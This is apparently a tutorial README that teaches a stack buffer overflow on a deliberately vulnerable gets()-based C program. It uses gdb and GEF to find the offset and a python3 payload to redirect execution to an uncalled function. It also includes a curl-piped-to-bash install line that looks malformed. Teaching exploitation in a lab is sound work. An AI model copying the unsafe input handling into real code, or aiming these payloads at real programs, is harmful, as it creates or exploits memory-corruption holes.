# Executing malicious code with buffer overflows

![Call Stack](https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Call_stack_layout.svg/342px-Call_stack_layout.svg.png)

Whenever you call a function, you add a "stack frame" onto the stack memory
which contains information about the function's local variables, its parameters,
and more importantly its return address.

Programs have something called an "instruction pointer" which points to the area
in memory the current instruction being executed is located.

Whenever a function returns, the stack frame is popped off the call stack and
the instruction pointer is set to the return address.

If we were somehow able to somehow overwrite this return address, it could be
possible for us to manipulate the program to execute a function that wasn't
meant to be executed, or even execute code that we ourselves inject into the
program's memory.

# GDB

GDB (**G**NU **D**e**b**ugger) is a useful program that allows us to "peak"
inside a program and check out areas of memory, namely values stored in
registers.

Being able to peer inside memory is supremely useful if you're attempting to
perform a buffer overflow attack and you happen to have access to the actual
program.

![GDB](https://user-images.githubusercontent.com/38366553/170348178-e19fe05b-6be3-43a9-8ddf-437a15dfce49.png)

You can try installing it from [this website](https://www.sourceware.org/gdb/download/)
or, if you're using a Debian based linux distro, a simple apt install will do
```console
$ sudo apt install gdb
```
For macOS (non-M1) you can use  
``` console
$ brew install gdb
```

# GEF

GEF (**G**DB **E**nhanced **F**eatures) has all the same features as GDB, but
with a little extra which will be handy for performing a buffer overflow attack.

Installing GEF is fairly simple, as all you need to do is run the following command:
```
$ curl -fsSL http://gef.blah.cat/sh | bash -c
```

[Read more](https://gef.readthedocs.io/en/master/)

# Using gdb to perform a simple buffer overflow attack

We will be trying to attack a very simple c program (source code can be found in simple/main.c)

```c
#include <stdio.h>

void hello() {
    printf("Hello\n");
}

int main() {
    char buf[20];
    gets(buf);
}
```
In this attack, we will make the function print hello even though the hello() function is not called in main().

1. Start gdb  
   ```console
   gdb <exec>
   ```  
   
2. Try to run the executable in gdb    

   ```
   gef> run 
   ```   
   
3. Try to find the length of the buffer so we know where we should start putting useful information 
   
   ```
   gef> pattern create -n 8 <length>
   ```  

   Generate a long string. (-n 8 because 64-bit)
   - Run the program and copy the long string generated by pattern create into the input field.
The output would look something like this:   

 <img width="993" alt="Screen Shot 2022-05-25 at 3 03 19 PM" src="https://user-images.githubusercontent.com/64151468/170350128-b1f69c21-96c0-4ade-a043-856e1fb77f95.png"> 
    - The boxed portion ($rbp) would be able to tell us how much did we overwrite the buffer.   
      We can also use the following command to look it up.
      
      ```
      gef> x $rbp 
      ```    
    
4. Look up the size of the buffer  
   ```
   gef> pattern offset <rbp_value>  
   ```
   
   <img width="484" alt="Screen Shot 2022-05-25 at 3 04 07 PM" src="https://user-images.githubusercontent.com/64151468/170350435-180895bd-c15d-4de7-a8ef-06597a40f41c.png"> 
   
   We can see the size of the buffer and likely endianess to use that to create our input.  

6. Find the address of hello() function so we can put it at the end of the buffer.  
    ``` 
    gef> info functions  
    ```
    <img width="410" alt="Screen Shot 2022-05-24 at 3 24 21 PM" src="https://user-images.githubusercontent.com/64151468/170339491-36dc6544-b5e4-42b0-b712-420315696880.png">

7. Exit out of gdb with Ctrl+D. Use python to put the input we want into a file (since the address may not be printable characters)  

```console
$ python3 -c "print('A'*(<offset>+8)+<address_of_function_in_correct_endian>)" > input.txt
```

example: 
```console
$ python3 -c "print('A'*(32+8)+'\x69\x51\x55\x55\x55\x55\x00\x00')" > input.txt
```
8. Run program in gdb with the input file.

    ```console
    $ gdb <exec>
    ```  
    ```
    gef> run < input.txt  
    ```  
   And then you should see the output.
                       
<img width="772" alt="Screen Shot 2022-05-25 at 3 11 30 PM" src="https://user-images.githubusercontent.com/64151468/170350970-5d8f1b4a-efaa-4681-9565-22c6596affab.png">
